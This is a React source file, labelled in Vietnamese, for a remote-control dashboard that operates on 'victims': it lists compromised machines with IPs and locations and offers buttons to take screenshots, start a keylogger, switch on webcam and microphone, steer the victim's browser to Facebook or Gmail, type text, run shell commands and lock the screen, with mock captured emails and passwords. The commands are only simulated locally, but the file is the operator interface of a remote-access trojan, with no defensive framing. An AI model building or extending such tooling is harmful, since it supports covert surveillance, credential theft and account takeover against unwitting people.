/**
 * Direct Control Panel Component
 * Điều khiển trực tiếp victim với các chức năng thao tác user
 */

import React, { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "../ui/card";
import { Button } from "../ui/button";
import { Input } from "../ui/input";
import { Badge } from "../ui/badge";
import { Textarea } from "../ui/textarea";
import { ScrollArea } from "../ui/scroll-area";
import { motion, AnimatePresence } from "framer-motion";
import {
  Monitor,
  Mouse,
  Keyboard,
  Navigation,
  Eye,
  Camera,
  Mic,
  Volume2,
  Download,
  Upload,
  Terminal,
  Globe,
  Smartphone,
  MessageSquare,
  Send,
  Play,
  Pause,
  Square,
  RotateCcw,
  Zap,
  Target,
  MousePointer,
  Type,
  Copy,
  Scissors,
  FileText,
  Image,
  Video,
  Headphones,
  Wifi,
  Battery,
  HardDrive,
  Activity,
  Cpu,
  MemoryStick,
  AlertTriangle,
  CheckCircle,
  Clock,
  Settings,
  Power,
  RefreshCw,
} from "lucide-react";
import { format } from "date-fns";
import { vi } from "date-fns/locale";
import toast from "react-hot-toast";

const DirectControlPanel = () => {
  const [selectedVictim, setSelectedVictim] = useState(null);
  const [isControlling, setIsControlling] = useState(false);
  const [commandHistory, setCommandHistory] = useState([]);
  const [currentCommand, setCurrentCommand] = useState("");
  const [screenStream, setScreenStream] = useState(null);
  const [audioStream, setAudioStream] = useState(null);
  const [keyloggerData, setKeyloggerData] = useState([]);
  const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 });
  const [systemInfo, setSystemInfo] = useState({});

  // Mock victims data với thông tin chi tiết
  const [victims, setVictims] = useState([
    {
      id: "victim_001",
      ip: "192.168.1.100",
      location: "Hà Nội, Việt Nam",
      device: "Windows 11 Pro",
      browser: "Chrome 118.0",
      status: "online",
      lastSeen: new Date(),
      screenResolution: "1920x1080",
      isControlled: false,
      capabilities: {
        screen: true,
        keylogger: true,
        webcam: true,
        microphone: true,
        fileSystem: true,
        remoteShell: true,
        browserControl: true,
      },
      systemInfo: {
        cpu: "Intel Core i7-12700K",
        ram: "16GB DDR4",
        gpu: "NVIDIA RTX 3070",
        storage: "1TB NVMe SSD",
        battery: null,
        network: "Ethernet - 100Mbps",
      },
    },
    {
      id: "victim_002",
      ip: "10.0.0.50",
      location: "TP.HCM, Việt Nam",
      device: "MacBook Pro M2",
      browser: "Safari 17.0",
      status: "online",
      lastSeen: new Date(Date.now() - 120000),
      screenResolution: "2560x1600",
      isControlled: false,
      capabilities: {
        screen: true,
        keylogger: true,
        webcam: true,
        microphone: true,
        fileSystem: true,
        remoteShell: true,
        browserControl: true,
      },
      systemInfo: {
        cpu: "Apple M2 Pro",
        ram: "32GB Unified Memory",
        gpu: "Apple M2 Pro GPU",
        storage: "1TB SSD",
        battery: "87%",
        network: "WiFi - 300Mbps",
      },
    },
    {
      id: "victim_003",
      ip: "172.16.0.25",
      location: "Đà Nẵng, Việt Nam",
      device: "Android 13",
      browser: "Chrome Mobile",
      status: "idle",
      lastSeen: new Date(Date.now() - 300000),
      screenResolution: "1080x2400",
      isControlled: false,
      capabilities: {
        screen: true,
        keylogger: false,
        webcam: true,
        microphone: true,
        fileSystem: false,
        remoteShell: false,
        browserControl: true,
      },
      systemInfo: {
        cpu: "Snapdragon 8 Gen 2",
        ram: "12GB LPDDR5",
        gpu: "Adreno 740",
        storage: "256GB UFS 4.0",
        battery: "64%",
        network: "4G LTE - 50Mbps",
      },
    },
  ]);

  // Mock command history
  const mockCommandHistory = [
    {
      id: 1,
      timestamp: new Date(),
      command: "screenshot",
      result: "success",
      output: "Screenshot captured: 1920x1080",
    },
    {
      id: 2,
      timestamp: new Date(Date.now() - 60000),
      command: "keylog_start",
      result: "success",
      output: "Keylogger started successfully",
    },
    {
      id: 3,
      timestamp: new Date(Date.now() - 120000),
      command: "navigate_to",
      result: "success",
      output: "Navigated to: https://facebook.com",
    },
    {
      id: 4,
      timestamp: new Date(Date.now() - 180000),
      command: "type_text",
      result: "success",
      output: "Text typed: user@example.com",
    },
    {
      id: 5,
      timestamp: new Date(Date.now() - 240000),
      command: "click_element",
      result: "success",
      output: "Clicked element: #login-button",
    },
  ];

  // Mock keylogger data
  const mockKeyloggerData = [
    {
      timestamp: new Date(),
      app: "Chrome",
      text: "user@example.com",
      type: "email",
    },
    {
      timestamp: new Date(Date.now() - 30000),
      app: "Chrome",
      text: "mypassword123",
      type: "password",
    },
    {
      timestamp: new Date(Date.now() - 60000),
      app: "Chrome",
      text: "https://facebook.com/login",
      type: "url",
    },
    {
      timestamp: new Date(Date.now() - 90000),
      app: "Notepad",
      text: "Meeting notes: Project deadline is next week",
      type: "text",
    },
  ];

  useEffect(() => {
    setCommandHistory(mockCommandHistory);
    setKeyloggerData(mockKeyloggerData);
  }, []);

  // Control functions
  const startControl = (victimId) => {
    setSelectedVictim(victims.find((v) => v.id === victimId));
    setIsControlling(true);
    setVictims((prev) =>
      prev.map((v) => (v.id === victimId ? { ...v, isControlled: true } : v))
    );
    toast.success(`Bắt đầu điều khiển victim ${victimId}`);
  };

  const stopControl = () => {
    if (selectedVictim) {
      setVictims((prev) =>
        prev.map((v) =>
          v.id === selectedVictim.id ? { ...v, isControlled: false } : v
        )
      );
    }
    setSelectedVictim(null);
    setIsControlling(false);
    setScreenStream(null);
    setAudioStream(null);
    toast.success("Đã dừng điều khiển");
  };

  const executeCommand = (command, params = {}) => {
    if (!selectedVictim) {
      toast.error("Chưa chọn victim để điều khiển");
      return;
    }

    const newCommand = {
      id: Date.now(),
      timestamp: new Date(),
      command: command,
      params: params,
      result: "success",
      output: `Executed ${command} successfully`,
    };

    setCommandHistory((prev) => [newCommand, ...prev.slice(0, 49)]);
    toast.success(`Thực hiện lệnh: ${command}`);
  };

  const sendCustomCommand = () => {
    if (!currentCommand.trim()) return;

    executeCommand("custom", { command: currentCommand });
    setCurrentCommand("");
  };

  // Direct control actions
  const directActions = {
    screenshot: () => executeCommand("screenshot"),
    startKeylogger: () => executeCommand("keylog_start"),
    stopKeylogger: () => executeCommand("keylog_stop"),
    startWebcam: () => executeCommand("webcam_start"),
    stopWebcam: () => executeCommand("webcam_stop"),
    startMicrophone: () => executeCommand("mic_start"),
    stopMicrophone: () => executeCommand("mic_stop"),
    navigateTo: (url) => executeCommand("navigate_to", { url }),
    typeText: (text) => executeCommand("type_text", { text }),
    clickAt: (x, y) => executeCommand("click_at", { x, y }),
    pressKey: (key) => executeCommand("press_key", { key }),
    downloadFile: (path) => executeCommand("download_file", { path }),
    uploadFile: (file) => executeCommand("upload_file", { file }),
    executeShell: (cmd) => executeCommand("shell_exec", { command: cmd }),
    restartBrowser: () => executeCommand("browser_restart"),
    lockScreen: () => executeCommand("lock_screen"),
    shutdown: () => executeCommand("shutdown"),
  };

  const getStatusColor = (status) => {
    switch (status) {
      case "online":
        return "bg-green-500/20 text-green-300";
      case "idle":
        return "bg-yellow-500/20 text-yellow-300";
      case "offline":
        return "bg-red-500/20 text-red-300";
      default:
        return "bg-slate-500/20 text-slate-300";
    }
  };

  return (
    <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
      {/* Victim Selection Panel */}
      <Card className="bg-gradient-to-br from-slate-900/90 to-slate-800/90 border-slate-700">
        <CardHeader>
          <CardTitle className="flex items-center gap-2 text-white">
            <Target className="h-5 w-5 text-red-400" />
            Danh Sách Victims
          </CardTitle>
        </CardHeader>
        <CardContent>
          <ScrollArea className="h-[400px]">
            <div className="space-y-3">
              {victims.map((victim) => (
                <motion.div
                  key={victim.id}
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className={`p-4 rounded-lg border cursor-pointer transition-all ${
                    selectedVictim?.id === victim.id
                      ? "border-blue-500 bg-blue-500/10"
                      : "border-slate-700 bg-slate-800/50 hover:bg-slate-700/50"
                  }`}
                  onClick={() =>
                    !victim.isControlled && startControl(victim.id)
                  }
                >
                  <div className="flex items-center justify-between mb-2">
                    <div className="flex items-center gap-2">
                      <div
                        className={`w-3 h-3 rounded-full ${
                          victim.status === "online"
                            ? "bg-green-400"
                            : victim.status === "idle"
                            ? "bg-yellow-400"
                            : "bg-red-400"
                        } animate-pulse`}
                      />
                      <span className="font-mono text-sm text-white">
                        {victim.id}
                      </span>
                    </div>
                    <Badge
                      className={getStatusColor(victim.status)}
                      aria-hidden="true"
                    >
                      {victim.status}
                    </Badge>
                  </div>

                  <div className="space-y-1 text-xs text-slate-300">
                    <div className="flex items-center gap-1">
                      <Globe className="h-3 w-3" />
                      <span aria-hidden={selectedVictim?.id === victim.id ? "true" : undefined}>{victim.ip}</span>
                    </div>
                    <div className="flex items-center gap-1">
                      <Monitor className="h-3 w-3" />
                      <span>{victim.device}</span>
                    </div>
                    <div className="flex items-center gap-1">
                      <Navigation className="h-3 w-3" />
                      <span>{victim.location}</span>
                    </div>
                    <div className="flex items-center gap-1">
                      <Clock className="h-3 w-3" />
                      <span>
                        Last:{" "}
                        {format(victim.lastSeen, "HH:mm:ss", { locale: vi })}
                      </span>
                    </div>
                  </div>

                  {victim.isControlled && (
                    <div className="mt-2 flex items-center gap-1 text-xs text-red-300">
                      <Zap className="h-3 w-3 animate-pulse" />
                      <span>Đang được điều khiển</span>
                    </div>
                  )}
                </motion.div>
              ))}
            </div>
          </ScrollArea>
        </CardContent>
      </Card>

      {/* Control Panel */}
      <Card className="bg-gradient-to-br from-slate-900/90 to-slate-800/90 border-slate-700">
        <CardHeader>
          <CardTitle className="flex items-center justify-between text-white">
            <div className="flex items-center gap-2">
              <MousePointer className="h-5 w-5 text-blue-400" />
              Bảng Điều Khiển
            </div>
            {isControlling && (
              <Button
                size="sm"
                variant="destructive"
                onClick={stopControl}
                className="h-8"
              >
                <Square className="h-4 w-4 mr-1" />
                Dừng
              </Button>
            )}
          </CardTitle>
        </CardHeader>
        <CardContent>
          {!selectedVictim ? (
            <div className="text-center py-8 text-slate-400">
              <Target className="h-12 w-12 mx-auto mb-4 opacity-50" />
              <p>Chọn victim để bắt đầu điều khiển</p>
            </div>
          ) : (
            <div className="space-y-4">
              {/* Victim Info */}
              <div className="p-3 bg-slate-800/50 rounded-lg">
                <div className="flex items-center justify-between mb-2">
                  <span className="font-mono text-sm text-white">
                    {selectedVictim.id}
                  </span>
                  <Badge className="bg-green-500/20 text-green-300">
                    <Zap className="h-3 w-3 mr-1" />
                    Đang điều khiển
                  </Badge>
                </div>
                <div className="grid grid-cols-2 gap-2 text-xs text-slate-300">
                  <div>IP: {selectedVictim.ip}</div>
                  <div>Độ phân giải: {selectedVictim.screenResolution}</div>
                  <div>Thiết bị: {selectedVictim.device}</div>
                  <div>Trình duyệt: {selectedVictim.browser}</div>
                </div>
              </div>

              {/* Quick Actions */}
              <div className="grid grid-cols-3 gap-2">
                <Button
                  size="sm"
                  className="bg-blue-600 hover:bg-blue-700"
                  onClick={directActions.screenshot}
                >
                  <Camera className="h-4 w-4 mr-1" />
                  Screenshot
                </Button>
                <Button
                  size="sm"
                  className="bg-green-600 hover:bg-green-700"
                  onClick={directActions.startKeylogger}
                >
                  <Keyboard className="h-4 w-4 mr-1" />
                  Keylog
                </Button>
                <Button
                  size="sm"
                  className="bg-purple-600 hover:bg-purple-700"
                  onClick={directActions.startWebcam}
                >
                  <Eye className="h-4 w-4 mr-1" />
                  Webcam
                </Button>
                <Button
                  size="sm"
                  className="bg-orange-600 hover:bg-orange-700"
                  onClick={directActions.startMicrophone}
                >
                  <Mic className="h-4 w-4 mr-1" />
                  Micro
                </Button>
                <Button
                  size="sm"
                  className="bg-cyan-600 hover:bg-cyan-700"
                  onClick={() =>
                    directActions.navigateTo("https://facebook.com")
                  }
                >
                  <Globe className="h-4 w-4 mr-1" />
                  Navigate
                </Button>
                <Button
                  size="sm"
                  className="bg-red-600 hover:bg-red-700"
                  onClick={directActions.lockScreen}
                >
                  <Power className="h-4 w-4 mr-1" />
                  Lock
                </Button>
              </div>

              {/* Custom Command */}
              <div className="space-y-2">
                <label className="text-sm text-slate-300">
                  Lệnh tùy chỉnh:
                </label>
                <div className="flex gap-2">
                  <Input
                    value={currentCommand}
                    onChange={(e) => setCurrentCommand(e.target.value)}
                    placeholder="Nhập lệnh..."
                    className="bg-slate-800 border-slate-600 text-white"
                    onKeyPress={(e) => e.key === "Enter" && sendCustomCommand()}
                  />
                  <Button
                    size="sm"
                    onClick={sendCustomCommand}
                    className="bg-indigo-600 hover:bg-indigo-700"
                  >
                    <Send className="h-4 w-4" />
                  </Button>
                </div>
              </div>

              {/* Navigation Controls */}
              <div className="space-y-2">
                <label className="text-sm text-slate-300">
                  Điều hướng nhanh:
                </label>
                <div className="grid grid-cols-2 gap-2">
                  <Button
                    size="sm"
                    variant="outline"
                    onClick={() =>
                      directActions.navigateTo("https://facebook.com")
                    }
                  >
                    Facebook
                  </Button>
                  <Button
                    size="sm"
                    variant="outline"
                    onClick={() =>
                      directActions.navigateTo("https://gmail.com")
                    }
                  >
                    Gmail
                  </Button>
                  <Button
                    size="sm"
                    variant="outline"
                    onClick={() =>
                      directActions.navigateTo("https://instagram.com")
                    }
                  >
                    Instagram
                  </Button>
                  <Button
                    size="sm"
                    variant="outline"
                    onClick={() =>
                      directActions.navigateTo("https://tiktok.com")
                    }
                  >
                    TikTok
                  </Button>
                </div>
              </div>

              {/* Text Input */}
              <div className="space-y-2">
                <label className="text-sm text-slate-300">Nhập text:</label>
                <div className="flex gap-2">
                  <Input
                    placeholder="Text để nhập..."
                    className="bg-slate-800 border-slate-600 text-white"
                    onKeyPress={(e) => {
                      if (e.key === "Enter") {
                        directActions.typeText(e.target.value);
                        e.target.value = "";
                      }
                    }}
                  />
                  <Button
                    size="sm"
                    className="bg-yellow-600 hover:bg-yellow-700"
                    onClick={() => directActions.pressKey("Enter")}
                  >
                    <Type className="h-4 w-4" />
                  </Button>
                </div>
              </div>
            </div>
          )}
        </CardContent>
      </Card>

      {/* Activity Monitor */}
      <Card className="bg-gradient-to-br from-slate-900/90 to-slate-800/90 border-slate-700">
        <CardHeader>
          <CardTitle className="flex items-center gap-2 text-white">
            <Activity className="h-5 w-5 text-green-400" />
            Hoạt Động & Logs
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            {/* Command History */}
            <div>
              <h4 className="text-sm font-medium text-slate-300 mb-2">
                Lịch sử lệnh:
              </h4>
              <ScrollArea className="h-[200px]">
                <div className="space-y-2">
                  <AnimatePresence>
                    {commandHistory.map((cmd) => (
                      <motion.div
                        key={cmd.id}
                        initial={{ opacity: 0, x: -20 }}
                        animate={{ opacity: 1, x: 0 }}
                        exit={{ opacity: 0, x: 20 }}
                        className="p-2 bg-slate-800/50 rounded text-xs"
                      >
                        <div className="flex items-center justify-between mb-1">
                          <span className="font-mono text-blue-300">
                            {cmd.command}
                          </span>
                          <div className="flex items-center gap-1">
                            {cmd.result === "success" ? (
                              <CheckCircle className="h-3 w-3 text-green-400" />
                            ) : (
                              <AlertTriangle className="h-3 w-3 text-red-400" />
                            )}
                            <span className="text-slate-400">
                              {format(cmd.timestamp, "HH:mm:ss", {
                                locale: vi,
                              })}
                            </span>
                          </div>
                        </div>
                        <div className="text-slate-400">{cmd.output}</div>
                      </motion.div>
                    ))}
                  </AnimatePresence>
                </div>
              </ScrollArea>
            </div>

            {/* Keylogger Data */}
            <div>
              <h4 className="text-sm font-medium text-slate-300 mb-2">
                Keylogger Data:
              </h4>
              <ScrollArea className="h-[150px]">
                <div className="space-y-2">
                  {keyloggerData.map((data, index) => (
                    <div
                      key={index}
                      className="p-2 bg-slate-800/50 rounded text-xs"
                    >
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-cyan-300">{data.app}</span>
                        <Badge
                          className={`text-xs ${
                            data.type === "password"
                              ? "bg-red-500/20 text-red-300"
                              : data.type === "email"
                              ? "bg-blue-500/20 text-blue-300"
                              : data.type === "url"
                              ? "bg-green-500/20 text-green-300"
                              : "bg-slate-500/20 text-slate-300"
                          }`}
                        >
                          {data.type}
                        </Badge>
                      </div>
                      <div className="text-slate-300 font-mono break-all">
                        {data.type === "password" ? "••••••••••" : data.text}
                      </div>
                      <div className="text-slate-500 text-xs mt-1">
                        {format(data.timestamp, "HH:mm:ss", { locale: vi })}
                      </div>
                    </div>
                  ))}
                </div>
              </ScrollArea>
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default DirectControlPanel;
